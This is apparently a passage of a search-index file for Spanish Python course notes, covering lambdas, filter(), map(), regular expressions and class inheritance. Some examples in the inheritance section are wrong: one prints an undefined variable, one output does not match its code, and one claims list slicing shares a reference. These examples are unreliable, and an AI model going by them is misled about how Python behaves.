utilizarlas, y tambi\u00e9n como como convertir algunos objetos a iteradores. Os sugiero probar por vuestra cuenta m\u00e1s colecciones a ver si encontr\u00e1is alguna m\u00e1s que se pueda iterar.","title":"Iteradores"},{"location":"lenguajes/python3/apuntes-Funcionalidades_avanzadas/#funciones-lambda","text":"Si empiezo diciendo que las funciones o expresiones lambda sirven para crear funciones an\u00f3nimas, posiblemente me dir\u00e9is \u00bfqu\u00e9 me est\u00e1s contando?, as\u00ed que vamos a tomarlo con calma, pues estamos ante unas de las funcionalidades m\u00e1s potentes de Python a la vez que m\u00e1s confusas para los principiantes. Una funci\u00f3n an\u00f3nima, como su nombre indica es una funci\u00f3n sin nombre. \u00bfEs posible ejecutar una funci\u00f3n sin referenciar un nombre? Pues s\u00ed, en Python podemos ejecutar una funci\u00f3n sin definirla con def . De hecho son similares pero con una diferencia fundamental: El contenido de una funci\u00f3n lambda debe ser una \u00fanica expresi\u00f3n en lugar de un bloque de acciones. Y es que m\u00e1s all\u00e1 del sentido de funci\u00f3n que tenemos, con su nombre y sus acciones internas, una funci\u00f3n en su sentido m\u00e1s trivial significa realizar algo sobre algo. Por tanto podr\u00edamos decir que, mientras las funciones an\u00f3nimas lambda sirven para realizar funciones simples, las funciones definidas con def sirven para manejar tareas m\u00e1s extensas. Si deconstruimos una funci\u00f3n sencilla, podemos llegar a una funci\u00f3n lambda. Por ejemplo tomad la siguiente funci\u00f3n para doblar un valor: def doblar ( num ): resultado = num * 2 return resultado doblar ( 2 ) 4 Vamos a simplificar el c\u00f3digo lo m\u00e1ximo posible: def doblar ( num ): return num * 2 Todav\u00eda m\u00e1s, podemos escribirlo todo en una sola l\u00ednea: def doblar ( num ): return num * 2 Esta notaci\u00f3n simple es la que una funci\u00f3n lambda intenta replicar, fijaros, vamos a convertir la funci\u00f3n en una funci\u00f3n an\u00f3nima: lambda num : num * 2 <function __main__.<lambda>> \u00a1Hual\u00e1! Aqu\u00ed tenemos una funci\u00f3n an\u00f3nima con una entrada que recibe num , y una salida que devuelve num * 2 . Lo \u00fanico que necesitamos hacer para utilizarla es guardarla en una variable y utilizarla tal como har\u00edamos con una funci\u00f3n normal: doblar = lambda num : num * 2 doblar ( 2 ) 4 Gracias a la flexibilidad de Python podemos implementar infinitas funciones simples. Por ejemplo comprobar si un n\u00famero es impar: impar = lambda num : num % 2 != 0 impar ( 5 ) True Darle la vuelta a una cadena utilizando slicing: revertir = lambda cadena : cadena [:: - 1 ] revertir ( \"Hola\" ) 'aloH' Incluso podemos enviar varios valores, por ejemplo para sumar dos n\u00fameros: sumar = lambda x , y : x + y sumar ( 5 , 2 ) 7 Como v\u00e9is podemos realizar cualquier cosa que se nos ocurra, siempre que lo podamos definir en una sola expresi\u00f3n. Por ahora lo dejamos aqu\u00ed, pero en las pr\u00f3ximas lecciones veremos como utilizar la funci\u00f3n lambda en conjunto con otras funciones como filter() y map() , que es cuando sale a relucir su verdadero potencial.","title":"Funciones Lambda"},{"location":"lenguajes/python3/apuntes-Funcionalidades_avanzadas/#funcion-filter","text":"Tal como su nombre indica filter significa filtrar, y es una de mis funciones favoritas, ya que a partir de una lista o iterador, y una funci\u00f3n condicional, es capaz de devolver una nueva colecci\u00f3n con los elementos filtrados que cumplan la condici\u00f3n. Por ejemplo, supongamos que tenemos una lista varios n\u00fameros y queremos filtrarla, qued\u00e1ndonos \u00fanicamente con los m\u00faltiples de 5... def multiple ( numero ): # Primero declaramos una funci\u00f3n condicional if numero % 5 == 0 : # Comprobamos si un numero es m\u00faltiple de cinco return True # S\u00f3lo devolvemos True si lo es numeros = [ 2 , 5 , 10 , 23 , 50 , 33 ] filter ( multiple , numeros ) <filter at 0x257ac84abe0> Si ejecutamos el filtro obtenemos un objeto de tipo filtro, pero podemos transformarlo en una lista f\u00e1cilmente haciendo un cast: list ( filter ( multiple , numeros ) ) [5, 10, 50] Por tanto cuando utilizamos la funci\u00f3n filter() tenemos que enviar una funci\u00f3n condicional, pero como recordar\u00e9is, no es necesario definirla, podemos utlizar una funci\u00f3n an\u00f3nima lambda: list ( filter ( lambda numero : numero % 5 == 0 , numeros ) ) [5, 10, 50] As\u00ed, en una sola l\u00ednea hemos definido y ejecutado el filtro utilizando una funci\u00f3n condicional an\u00f3nima y una lista de numeros.","title":"Funci\u00f3n filter()"},{"location":"lenguajes/python3/apuntes-Funcionalidades_avanzadas/#filtrando-objetos","text":"Sin embargo, para m\u00ed, m\u00e1s all\u00e1 de filtrar listas con valores simples, el verdadero potencial de filter() sale a relucir cuando necesitamos filtrar varios objetos de una lista. Por ejemplo, dada una lista con varias personas, nos gustar\u00eda filtrar \u00fanicamente las que son menores de edad: class Persona : def __init__ ( self , nombre , edad ): self . nombre = nombre self . edad = edad def __str__ ( self ): return \" {} de {} a\u00f1os\" . format ( self . nombre , self . edad ) personas = [ Persona ( \"Juan\" , 35 ), Persona ( \"Marta\" , 16 ), Persona ( \"Manuel\" , 78 ), Persona ( \"Eduardo\" , 12 ) ] Para hacerlo nos vamos a servir de una funci\u00f3n lambda, comprobando el campo edad para cada persona: menores = filter ( lambda persona : persona . edad < 18 , personas ) for menor in menores : print ( menor ) Marta de 16 a\u00f1os Eduardo de 12 a\u00f1os S\u00e9 que es un ejemplo sencillo, pero estoy seguro que os puede servir como base para realizar filtrados en muchos de vuestros proyectos.","title":"Filtrando objetos"},{"location":"lenguajes/python3/apuntes-Funcionalidades_avanzadas/#funcion-map","text":"Esta funci\u00f3n trabaja de una forma muy similar a filter() , con la diferencia que en lugar de aplicar una condici\u00f3n a un elemento de una lista o secuencia, aplica una funci\u00f3n sobre todos los elementos y como resultado se devuelve un iterable de tipo map: def doblar ( numero ): return numero * 2 numeros = [ 2 , 5 , 10 , 23 , 50 , 33 ] map ( doblar , numeros ) <map at 0x212eb6e0748> F\u00e1cilmente podemos transformar este iterable en una lista: list ( map ( doblar , numeros )) [4, 10, 20, 46, 100, 66] Y podemos simplificarlo con una funci\u00f3n lambda para substituir la llamada de una funci\u00f3n definida: list ( map ( lambda x : x * 2 , numeros ) ) [4, 10, 20, 46, 100, 66] La funci\u00f3n map() se utiliza mucho junto a expresiones lambda ya que permite ahorrarnos el esfuerzo de crear bucles for. Adem\u00e1s se puede utilizar sobre m\u00e1s de un iterable con la condici\u00f3n que tengan la misma longitud. Por ejemplo si queremos multiplicar los n\u00fameros de dos listas: a = [ 1 , 2 , 3 , 4 , 5 ] b = [ 6 , 7 , 8 , 9 , 10 ] list ( map ( lambda x , y : x * y , a , b ) ) [6, 14, 24, 36, 50] E incluso podemos extender la funcionalidad a tres listas o m\u00e1s: c = [ 11 , 12 , 13 , 14 , 15 ] list ( map ( lambda x , y , z : x * y * z , a , b , c ) ) [66, 168, 312, 504, 750]","title":"Funci\u00f3n map()"},{"location":"lenguajes/python3/apuntes-Funcionalidades_avanzadas/#mapeando-objetos","text":"Evidentemente, siempre que la utilicemos correctamente podemos mapear una serie de objetos sin ning\u00fan problema: class Persona : def __init__ ( self , nombre , edad ): self . nombre = nombre self . edad = edad def __str__ ( self ): return \" {} de {} a\u00f1os\" . format ( self . nombre , self . edad ) personas = [ Persona ( \"Juan\" , 35 ), Persona ( \"Marta\" , 16 ), Persona ( \"Manuel\" , 78 ), Persona ( \"Eduardo\" , 12 ) ] Por ejemplo una funci\u00f3n para incrementar un a\u00f1o de edad a todas las personas de la lista: def incrementar ( p ): p . edad += 1 return p personas = map ( incrementar , personas ) for persona in personas : print ( persona ) Juan de 36 a\u00f1os Marta de 17 a\u00f1os Manuel de 79 a\u00f1os Eduardo de 13 a\u00f1os Claro que en este caso tenemos que utilizar una funci\u00f3n definida porque no necesitamos actuar sobre la instancia, a no ser que nos tomemos la molestia de rehacer todo el objeto: personas = [ Persona ( \"Juan\" , 35 ), Persona ( \"Marta\" , 16 ), Persona ( \"Manuel\" , 78 ), Persona ( \"Eduardo\" , 12 ) ] personas = map ( lambda p : Persona ( p . nombre , p . edad + 1 ), personas ) for persona in personas : print ( persona ) Juan de 36 a\u00f1os Marta de 17 a\u00f1os Manuel de 79 a\u00f1os Eduardo de 13 a\u00f1os Y con esto acabamos esta interesante funcionalidad.","title":"Mapeando objetos"},{"location":"lenguajes/python3/apuntes-Funcionalidades_avanzadas/#expresiones-regulares","text":"Una de las tareas m\u00e1s utilizadas en la programaci\u00f3n es la b\u00fasqueda de subcadenas o patrones dentro de otras cadenas de texto. Las expresiones regulares, tambi\u00e9n conocidas como 'regex' o 'regexp', son patrones de b\u00fasqueda definidos con una sintaxis formal. Siempre que sigamos sus reglas, podremos realizar b\u00fasquedas simples y avanzadas, que utilizadas en conjunto con otras funcionalidades, las vuelven una de las opciones m\u00e1s \u00fatiles e importantes de cualquier lenguaje. Sin embargo antes de utilizarlas hay que estar seguros de lo que hacemos, de ah\u00ed aquella famosa frase de Jamie Zawinski , programador y hacker: Some people, when confronted with a problem, think \"I know, I'll use regular expressions.\" Now they have two problems. Que viene a decir: Hay gente que, cuando se enfrenta a un problema, piensa \"Ya s\u00e9, usar\u00e9 expresiones regulares\". Ahora tienen dos problemas.","title":"Expresiones regulares"},{"location":"lenguajes/python3/apuntes-Funcionalidades_avanzadas/#metodos-basicos","text":"","title":"M\u00e9todos b\u00e1sicos"},{"location":"lenguajes/python3/apuntes-Funcionalidades_avanzadas/#research-buscar-un-patron-en-otra-cadena","text":"import re texto = \"En esta cadena se encuentra una palabra m\u00e1gica\" re . search ( 'm\u00e1gica' , texto ) <_sre.SRE_Match object; span=(40, 46), match='m\u00e1gica'> Como vemos, al realizar la b\u00fasqueda lo que nos encontramos es un objeto de tipo Match (encontrado), en lugar un simple True o False . En cambio, si no se encontrase la palabra, no se devolver\u00eda nada ( None ): re . search ( 'hola' , texto ) Por tanto, podemos utilizar la propia funcionalidad junto a un condicional sin ning\u00fan problema: palabra = \"m\u00e1gica\" encontrado = re . search ( palabra , texto ) if encontrado : print ( \"Se ha encontrado la palabra:\" , palabra ) else : print ( \"No se ha encontrado la palabra:\" , palabra ) Se ha encontrado la palabra: m\u00e1gica Sin embargo, volviendo al objeto devuelto de tipo Match , \u00e9ste nos ofrece algunas opciones interesantes. print ( encontrado . start () ) # Posici\u00f3n donde empieza la coincidencia print ( encontrado . end () ) # Posici\u00f3n donde termina la coincidencia print ( encontrado . span () ) # Tupla con posiciones donde empieza y termina la coincidencia print ( encontrado . string ) # Cadena sobre la que se ha realizado la b\u00fasqueda 40 46 (40, 46) En esta cadena se encuentra una palabra m\u00e1gica Como vemos, en este objeto se esconde mucha m\u00e1s informaci\u00f3n de la que parece a simple vista, luego seguiremos hablando de ellos.","title":"re.search: buscar un patr\u00f3n en otra cadena"},{"location":"lenguajes/python3/apuntes-Funcionalidades_avanzadas/#rematch-buscar-un-patron-al-principio-de-otra-cadena","text":"texto = \"Hola mundo\" re . match ( 'Hola' , texto ) <_sre.SRE_Match object; span=(0, 4), match='Hola'> texto = \"Hola mundo\" re . match ( 'Mola' , texto ) # no devuelve nada Podemos extraer grupos de texto con () texto = 'https://www.elitetorrent.biz/series/tell-me-a-story-temporada-1-capitulo-9-espanol/' con = re . match ( r \".*series/(.*)-(temporada-[0-9]*)-(.*)\" , texto ) print ( con . groups ()) ( 'tell-me-a-story' , 'temporada-1' , 'capitulo-9-espanol/' )","title":"re.match: buscar un patr\u00f3n al principio de otra cadena"},{"location":"lenguajes/python3/apuntes-Funcionalidades_avanzadas/#resplit-dividir-una-cadena-a-partir-de-un-patron","text":"texto = \"Vamos a dividir esta cadena\" re . split ( ' ' , texto ) ['Vamos', 'a', 'dividir', 'esta', 'cadena']","title":"re.split: dividir una cadena a partir de un patr\u00f3n"},{"location":"lenguajes/python3/apuntes-Funcionalidades_avanzadas/#resub-sustituye-todas-las-coincidencias-en-una-cadena","text":"texto = \"Hola amigo\" re . sub ( 'amigo' , 'amiga' , texto ) 'Hola amiga'","title":"re.sub: sustituye todas las coincidencias en una cadena"},{"location":"lenguajes/python3/apuntes-Funcionalidades_avanzadas/#refindall-buscar-todas-las-coincidencias-en-una-cadena","text":"texto = \"hola adios hola hola\" re . findall ( 'hola' , texto ) ['hola', 'hola', 'hola'] Aqu\u00ed se nos devuelve una lista, pero podr\u00edamos aplicar la funci\u00f3n len() para saber el n\u00famero: len ( re . findall ( 'hola' , texto )) 3","title":"re.findall: buscar todas las coincidencias en una cadena"},{"location":"lenguajes/python3/apuntes-Funcionalidades_avanzadas/#patrones-con-multiples-alternativas","text":"Si queremos comprobar varias posibilidades, podemos utilizar una tuber\u00eda | a modo de OR. Generalmente pondremos el listado de alternativas entre par\u00e9ntesis (): texto = \"hola adios hello bye\" re . findall ( 'hola|hello' , texto ) ['hola', 'hello']","title":"Patrones con m\u00faltiples alternativas"},{"location":"lenguajes/python3/apuntes-Funcionalidades_avanzadas/#patrones-con-sintaxis-repetida","text":"Otra posibilidad que se nos ofrece es la de buscar patrones con letras repetidas, y aqu\u00ed es donde se empieza a poner interesante. Como podemos o no saber de antemano el n\u00famero de repeticiones hay varias formas de definirlos. texto = \"hla hola hoola hooola hooooola\" Antes de continuar, y para aligerar todo el proceso, vamos a crear una funci\u00f3n capaz de ejecutar varios patrones en una lista sobre un texto: def buscar ( patrones , texto ): for patron in patrones : print ( re . findall ( patron , texto ) ) patrones = [ 'hla' , 'hola' , 'hoola' ] buscar ( patrones , texto ) ['hla'] ['hola'] ['hoola']","title":"Patrones con sintaxis repetida"},{"location":"lenguajes/python3/apuntes-Funcionalidades_avanzadas/#con-meta-caracter","text":"Lo utilizaremos para definir ninguna o m\u00e1s repeticiones de la letra a la izquierda del meta-car\u00e1cter: patrones = [ 'ho' , 'ho*' , 'ho*la' , 'hu*la' ] # 'ho', 'ho[0..N]', 'ho[0..N]la', 'hu[0..N]la' buscar ( patrones , texto ) ['ho', 'ho', 'ho', 'ho'] ['h', 'ho', 'hoo', 'hooo', 'hooooo'] ['hla', 'hola', 'hoola', 'hooola', 'hooooola'] ['hla']","title":"Con meta-car\u00e1cter *"},{"location":"lenguajes/python3/apuntes-Funcionalidades_avanzadas/#con-meta-caracter_1","text":"Lo utilizaremos para definir una o m\u00e1s repeticiones de la letra a la izquierda del meta-car\u00e1cter: patrones = [ 'ho*' , 'ho+' ] # 'ho[0..N], 'ho[1..N]' buscar ( patrones , texto ) ['h', 'ho', 'hoo', 'hooo', 'hooooo'] ['ho', 'hoo', 'hooo', 'hooooo']","title":"Con meta-car\u00e1cter +"},{"location":"lenguajes/python3/apuntes-Funcionalidades_avanzadas/#con-meta-caracter_2","text":"Lo utilizaremos para definir una o ninguna repetici\u00f3n de la letra a la izquierda del meta-car\u00e1cter: patrones = [ 'ho*' , 'ho+' , 'ho?' , 'ho?la' ] # 'ho[0..N], 'ho[1..N]', 'ho[0..1]', 'ho[0..1]la' buscar ( patrones , texto ) ['h', 'ho', 'hoo', 'hooo', 'hooooo'] ['ho', 'hoo', 'hooo', 'hooooo'] ['h', 'ho', 'ho', 'ho', 'ho'] ['hla', 'hola']","title":"Con meta-car\u00e1cter ?"},{"location":"lenguajes/python3/apuntes-Funcionalidades_avanzadas/#con-numero-de-repeticiones-explicito-n","text":"Lo utilizaremos para definir 'n' repeticiones exactas de la letra a la izquierda del meta-car\u00e1cter: patrones = [ 'ho {0} la' , 'ho {1} la' , 'ho {2} la' ] # 'ho[0]la', 'ho[1]la', 'ho[2]la' buscar ( patrones , texto ) ['hla'] ['hola'] ['hoola']","title":"Con n\u00famero de repeticiones expl\u00edcito {n}"},{"location":"lenguajes/python3/apuntes-Funcionalidades_avanzadas/#con-numero-de-repeticiones-en-un-rango-n-m","text":"Lo utilizaremos para definir un n\u00famero de repeticiones variable entre 'n' y 'm' de la letra a la izquierda del meta-car\u00e1cter: patrones = [ 'ho{0,1}la' , 'ho{1,2}la' , 'ho{2,9}la' ] # 'ho[0..1]la', 'ho[1..2]la', 'ho[2..9]la' buscar ( patrones , texto ) ['hla', 'hola'] ['hola', 'hoola'] ['hoola', 'hooola', 'hooooola']","title":"Con n\u00famero de repeticiones en un rango  {n, m}"},{"location":"lenguajes/python3/apuntes-Funcionalidades_avanzadas/#trabajando-con-conjuntos-de-caracteres","text":"Cuando nos interese crear un patr\u00f3n con distintos car\u00e1cteres, podemos definir conjuntos entre par\u00e9ntesis: texto = \"hala hela hila hola hula\" patrones = [ 'h[ou]la' , 'h[aio]la' , 'h[aeiou]la' ] buscar ( patrones , texto ) ['hola', 'hula'] ['hala', 'hila', 'hola'] ['hala', 'hela', 'hila', 'hola', 'hula'] Evidentemente los podemos utilizar con repeticiones: texto = \"haala heeela hiiiila hoooooola\" patrones = [ 'h[ae]la' , 'h[ae]*la' , 'h[io]{3,9}la' ] buscar ( patrones , texto ) [] ['haala', 'heeela'] ['hiiiila', 'hoooooola']","title":"Trabajando con conjuntos de caracteres [ ]"},{"location":"lenguajes/python3/apuntes-Funcionalidades_avanzadas/#exclusion-en-grupos","text":"Cuando utilizamos grupos podemos utilizar el operador de exclusi\u00f3n ^ para indicar una b\u00fasqueda contraria: texto = \"hala hela hila hola hula\" patrones = [ 'h[o]la' , 'h[^o]la' ] buscar ( patrones , texto ) ['hola'] ['hala', 'hela', 'hila', 'hula'] Si excluimos una expresi\u00f3n regular con un grupo excluido, en realidad tenemos lo mismo:","title":"Exclusi\u00f3n en grupos [^ ]"},{"location":"lenguajes/python3/apuntes-Funcionalidades_avanzadas/#rangos-","text":"Otra caracter\u00edstica que hace ultra potentes los grupos, es la capacidad de definir rangos. Ejemplos de rangos: [A-Z] : Cualquier car\u00e1cter alfab\u00e9tico en may\u00fascula (no especial ni n\u00famero) [a-z] : Cualquier car\u00e1cter alfab\u00e9tico en min\u00fascula (no especial ni n\u00famero) [A-Za-z] : Cualquier car\u00e1cter alfab\u00e9tico en min\u00fascula o may\u00fascula (no especial ni n\u00famero) [A-z] : Cualquier car\u00e1cter alfab\u00e9tico en min\u00fascula o may\u00fascula (no especial ni n\u00famero) [0-9] : Cualquier car\u00e1cter num\u00e9rico (no especial ni alfab\u00e9tico) [a-zA-Z0-9] : Cualquier car\u00e1cter alfanum\u00e9rico (no especial) Tened en cuenta que cualquier rango puede ser excluido para conseguir el patr\u00f3n contrario. texto = \"hola h0la Hola mola m0la M0la\" patrones = [ 'h[a-z]la' , 'h[0-9]la' , '[A-z] {4} ' , '[A-Z][A-z0-9] {3} ' ] buscar ( patrones , texto ) ['hola'] ['h0la'] ['hola', 'Hola', 'mola'] ['Hola', 'M0la'] #### C\u00f3digos escapados \\ Si cada vez que quisi\u00e9ramos definir un patr\u00f3n variable tuvi\u00e9ramos que crear rangos, al final tendr\u00edamos expresiones regulares gigantes. Por suerte su sintaxis tambi\u00e9n acepta una serie de caracteres escapados que tienen un significo \u00fanico. Algunos de los m\u00e1s importantes son: C\u00f3digo Significado \\d num\u00e9rico \\D no num\u00e9rico \\s espacio en blanco \\S no espacio en blanco \\w alfanum\u00e9rico \\W no alfanum\u00e9rico El problema que encontraremos en Python a la hora de definir c\u00f3digo escapado, es que las cadenas no tienen en cuenta el a no ser que especifiquemos que son cadenas en crudo (raw), por lo que tendremos que precedir las expresiones regulares con una 'r' . texto = \"Este curso de Python se public\u00f3 en el a\u00f1o 2016\" patrones = [ r '\\d+' , r '\\D+' , r '\\s' , r '\\S+' , r '\\w+' , r '\\W+' ] buscar ( patrones , texto ) ['2016'] ['Este curso de Python se public\u00f3 en el a\u00f1o '] [' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' '] ['Este', 'curso', 'de', 'Python', 'se', 'public\u00f3', 'en', 'el', 'a\u00f1o', '2016'] ['Este', 'curso', 'de', 'Python', 'se', 'public\u00f3', 'en', 'el', 'a\u00f1o', '2016'] [' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' '] Por mi parte lo vamos a dejar aqu\u00ed, pero el mundo de las expresiones regulares es gigantesco y dar\u00eda para un curso entero. Os animo a seguir aprendiendo leyendo documentaci\u00f3n y buscando ejemplos. Aqu\u00ed os dejo algunos enlaces que quiz\u00e1 os pueden servir, en ingl\u00e9s:","title":"Rangos [ - ]"},{"location":"lenguajes/python3/apuntes-Funcionalidades_avanzadas/#documentacion","text":"Hay docenas y docenas de c\u00f3digos especiales, si quer\u00e9is echar un vistazo a todos ellos pod\u00e9is consultar la documentaci\u00f3n oficial: https://docs.python.org/3.5/library/re.html#regular-expression-syntax Un resumen por parte de Google Eduacti\u00f3n: https://developers.google.com/edu/python/regular-expressions Otro resumen muy interesante sobre el tema: https://www.tutorialspoint.com/python/python_reg_expressions.htm Un par de documentos muy trabajados con ejemplos b\u00e1sicos y avanzados: http://www.python-course.eu/python3_re.php http://www.python-course.eu/python3_re_advanced.php","title":"Documentaci\u00f3n"},{"location":"lenguajes/python3/apuntes-Herencia/","text":"Herencias Estructura para los productos de una tienda Ejemplo sin herencia class Producto : def __init__ ( self , referencia , tipo , nombre , pvp , descripcion , productor = None , distribuidor = None , isbn = None , autor = None ): self . referencia = referencia self . tipo = tipo self . nombre = nombre self . pvp = pvp self . descripcion = descripcion self . productor = productor self . distribuidor = distribuidor self . isbn = isbn self . autor = autor adorno = Producto ( '000A' , 'ADORNO' , 'Vaso Adornado' , 15 , 'Vaso de porcelana con dibujos' ) print ( adorno ) <__main__.Producto at 0x5243810> adorno . tipo 'ADORNO' Creando una jerarqu\u00eda de productos con clases Superclase Producto class Producto : def __init__ ( self , referencia , nombre , pvp , descripcion ): self . referencia = referencia self . nombre = nombre self . pvp = pvp self . descripcion = descripcion def __str__ ( self ): return \"\"\" \\ REFERENCIA \\t {} NOMBRE \\t\\t {} PVP \\t\\t {} DESCRIPCI\u00d3N \\t {} \"\"\" . format ( self . referencia , self . nombre , self . pvp , self . descripcion ) Subclase Adorno class Adorno ( Producto ): pass a = Adorno ( 2034 , \"Vaso adornado\" , 15 , \"Vaso de porcelana adornado con \u00e1rboles\" ) print ( a ) Referencias 2034 Nombre Vaso adornado PVP 15 Descripcion Vaso de porcelana adornado con \u00e1rboles Subclase Alimento class Alimento ( Producto ): productor = \"\" distribuidor = \"\" def __str__ ( self ): return \"\"\" \\ REFERENCIA \\t {} NOMBRE \\t\\t {} PVP \\t\\t {} DESCRIPCI\u00d3N \\t {} PRODUCTOR \\t {} DISTRIBUIDOR \\t {} \"\"\" . format ( self . referencia , self . nombre , self . pvp , self . descripcion , self . productor , self . distribuidor ) al = Alimento ( 2035 , \"Botella de Aceite de Oliva Extra\" , 5 , \"250 ML\" ) al . productor = \"La Aceitera\" al . distribuidor = \"Distribuciones SA\" print ( al ) REFERENCIA 2035 NOMBRE Botella de Aceite de Oliva Extra PVP 5 DESCRIPCI\u00d3N 250 ML PRODUCTOR La Aceitera DISTRIBUIDOR Distribuciones SA Subclase Libro class Libro ( Producto ): isbn = \"\" autor = \"\" def __str__ ( self ): return \"\"\" \\ REFERENCIA \\t {} NOMBRE \\t\\t {} PVP \\t\\t {} DESCRIPCI\u00d3N \\t {} ISBN \\t\\t {} AUTOR \\t\\t {} \"\"\" . format ( self . referencia , self . nombre , self . pvp , self . descripcion , self . isbn , self . autor ) li = Libro ( 2036 , \"Cocina Mediterr\u00e1nea\" , 9 , \"Recetas sanas y buenas\" ) li . isbn = \"0-123456-78-9\" li . autor = \"Do\u00f1a Juana\" print ( li ) REFERENCIA 2036 NOMBRE Cocina Mediterr\u00e1nea PVP 9 DESCRIPCI\u00d3N Recetas sanas y buenas ISBN 0-123456-78-9 AUTOR Do\u00f1a Juana Trabajando con clases heredadas en conjunto class Producto : def __init__ ( self , referencia , nombre , pvp , descripcion ): self . referencia = referencia self . nombre = nombre self . pvp = pvp self . descripcion = descripcion def __str__ ( self ): return \"\"\" \\ REFERENCIA \\t {} NOMBRE \\t\\t {} PVP \\t\\t {} DESCRIPCI\u00d3N \\t {} \"\"\" . format ( self . referencia , self . nombre , self . pvp , self . descripcion ) class Adorno ( Producto ): pass class Alimento ( Producto ): productor = \"\" distribuidor = \"\" def __str__ ( self ): return super () . __str__ () + \"\"\" \\ PRODUCTOR \\t {} DISTRIBUIDOR \\t {} \"\"\" . format ( self . productor , self . distribuidor ) class Libro ( Producto ): isbn = \"\" autor = \"\" def __str__ ( self ): return super () . __str__ () + \"\"\" \\ ISBN \\t\\t {} AUTOR \\t\\t {} \"\"\" . format ( self . isbn , self . autor ) Creamos algunos objetos ad = Adorno ( 2034 , \"Vaso adornado\" , 15 , \"Vaso de porcelana adornado con \u00e1rboles\" ) al = Alimento ( 2035 , \"Botella de Aceite de Oliva Extra\" , 5 , \"250 ML\" ) al . productor = \"La Aceitera\" al . distribuidor = \"Distribuciones SA\" li = Libro ( 2036 , \"Cocina Mediterr\u00e1nea\" , 9 , \"Recetas sanas y buenas\" ) li . isbn = \"0-123456-78-9\" li . autor = \"Do\u00f1a Juana\" Lista de productos productos = [ ad , al ] productos . append ( li ) print ( productos ) [<__main__.Adorno at 0x14c58660940>, <__main__.Alimento at 0x14c586608d0>, <__main__.Libro at 0x14c58660978>] Lectura secuencial de productos con un for .. in for p in productos : print ( p , \" \\n \" ) REFERENCIA 2034 NOMBRE Vaso adornado PVP 15 DESCRIPCI\u00d3N Vaso de porcelana adornado con \u00e1rboles REFERENCIA 2035 NOMBRE Botella de Aceite de Oliva Extra PVP 5 DESCRIPCI\u00d3N 250 ML PRODUCTOR La Aceitera DISTRIBUIDOR Distribuciones SA REFERENCIA 2036 NOMBRE Cocina Mediterr\u00e1nea PVP 9 DESCRIPCI\u00d3N Recetas sanas y buenas ISBN 0-123456-78-9 AUTOR Do\u00f1a Juana Podemos acceder a los atributos si son compartidos entre todos los objetos for p in productos : print ( p . referencia , p . nombre ) 2034 Vaso adornado 2035 Botella de Aceite de Oliva Extra 2036 Cocina Mediterr\u00e1nea Pero si un objeto no tiene el atributo deseado, dar\u00e1 error: for p in productos : print ( p . autor ) --------------------------------------------------------------------------- AttributeError Traceback (most recent call last) <ipython-input-8-36e9baf5c1cc> in <module>() 1 for p in productos: ----> 2 print(p.autor) AttributeError: 'Adorno' object has no attribute 'autor' Tendremos que tratar cada subclase de forma distinta, gracias a la funci\u00f3n isistance(): for p in productos : if ( isinstance ( p , Adorno ) ): print ( p . referencia , p . nombre ) elif ( isinstance ( p , Alimento ) ): print ( p . referencia , p . nombre , p . productor ) elif ( isinstance ( p , Libro ) ): print ( p . referencia , p . nombre , p . isbn ) 2034 Vaso adornado 2035 Botella de Aceite de Oliva Extra La Aceitera 2036 Cocina Mediterr\u00e1nea 0-123456-78-9 Funciones que reciben objetos de distintas clases Los obetos se env\u00edan por referencia a las funciones As\u00ed que debemos tener en cuenta que cualquier cambio realizado dentro afectar\u00e1 al propio objeto. def rebajar_producto ( p , rebaja ): \"\"\"Rebaja un producto en porcentaje de su precio\"\"\" p . pvp = p . pvp - ( p . pvp / 100 * rebaja ) rebajar_producto ( al , 10 ) print ( al_rebajado ) REFERENCIA 2038 NOMBRE Botella de Aceite de Oliva Extra PVP 4.5 DESCRIPCI\u00d3N 250 ML PRODUCTOR La Aceitera DISTRIBUIDOR Distribuciones SA print ( al ) REFERENCIA 2035 NOMBRE Botella de Aceite de Oliva Extra PVP 4.5 DESCRIPCI\u00d3N 250 ML PRODUCTOR La Aceitera DISTRIBUIDOR Distribuciones SA Una copia de un objeto tambi\u00e9n hace referencia al objeto copiado (como un acceso directo) copia_al = al copia_al . referencia = 2038 print ( copia_al ) REFERENCIA 2038 NOMBRE Botella de Aceite de Oliva Extra PVP 4.5 DESCRIPCI\u00d3N 250 ML PRODUCTOR La Aceitera DISTRIBUIDOR Distribuciones SA print ( al ) REFERENCIA 2038 NOMBRE Botella de Aceite de Oliva Extra PVP 4.5 DESCRIPCI\u00d3N 250 ML PRODUCTOR La Aceitera DISTRIBUIDOR Distribuciones SA Esto tambi\u00e9n sucede con los tipos compuestos: l = [ 1 , 2 , 3 ] l2 = l [:] l2 . append ( 4 ) l [1, 2, 3, 4] Para crear una copia 100% nueva debemos utilizar el m\u00f3dulo copy: import copy copia_ad = copy . copy ( ad ) print ( copia_ad ) REFERENCIA 2034 NOMBRE Vaso adornado PVP 15 DESCRIPCI\u00d3N Vaso de porcelana adornado con \u00e1rboles copia_ad . pvp = 25 print ( copia_ad ) REFERENCIA 2034 NOMBRE Vaso adornado PVP 25 DESCRIPCI\u00d3N Vaso de porcelana adornado con \u00e1rboles print ( ad ) REFERENCIA 2034 NOMBRE Vaso adornado PVP 15 DESCRIPCI\u00d3N Vaso de porcelana adornado con \u00e1rboles Polimorfismo Se refiere a una propiedad de la herencia por la que objetos de distintas subclases pueden responder a una misma acci\u00f3n. def rebajar_producto ( p , rebaja ): p . pvp = p . pvp - ( p . pvp / 100 * rebaja ) El m\u00e9todo rebajar_producto() es capaz de tomar objetos de distintas subclases y manipular el atributo pvp . La acci\u00f3n de manipular el pvp funcionar\u00e1 siempre que los objetos tengan \u00e9se atributo, pero en el caso de no ser as\u00ed, dar\u00eda error. La polimorfia es impl\u00edcita en Python en todos los objetos, ya que todos son hijos de una superclase com\u00fan llamada Object . Herencia m\u00faltiple Posibilidad de que una subclase herede de m\u00faltiples superclases. El problema aparece cuando las superclases tienen atributos o m\u00e9todos comunes. En estos casos, Python dar\u00e1 prioridad a las clases m\u00e1s a la izquierda en el momento de la declaraci\u00f3n de la subclase. class A : def __init__ ( self ): print ( \"Soy de clase A\" ) def a ( self ): print ( \"Este m\u00e9todo lo heredo de A\" ) class B : def __init__ ( self ): print ( \"Soy de clase B\" ) def b ( self ): print ( \"Este m\u00e9todo lo heredo de B\" ) class C ( B , A ): def c ( self ): print ( \"Este m\u00e9todo es de C\" ) c = C () Soy de clase B c . a () Este m\u00e9todo lo heredo de A c . b () Este m\u00e9todo lo heredo de B c . c () Este m\u00e9todo es de C Ejercicio: Herencia 